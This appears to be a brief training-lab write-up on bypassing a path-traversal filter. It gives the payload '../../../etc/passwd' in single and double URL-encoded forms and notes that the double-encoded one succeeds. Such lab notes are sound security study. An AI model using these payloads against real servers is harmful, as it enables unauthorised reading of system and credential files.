---
title: File path traversal, traversal sequences stripped with superfluous URL-decode
category: Path traversal
difficulty: Practitioner
tags:
  - broken-access-control
  - path-traversal
---
Based on the lab title and description, this lab requires a URL-encoded traversal payload.

Encoding the usual payload `../../../etc/passwd` once gives:

`%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`

The single-encoded version does not work:
![[file-path-traversal-traversal-sequences-stripped-with-superfluous-urldecode-img1.png]]

Using the double URL-encoded version works:

`%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`

![[file-path-traversal-traversal-sequences-stripped-with-superfluous-urldecode-img2.png]]
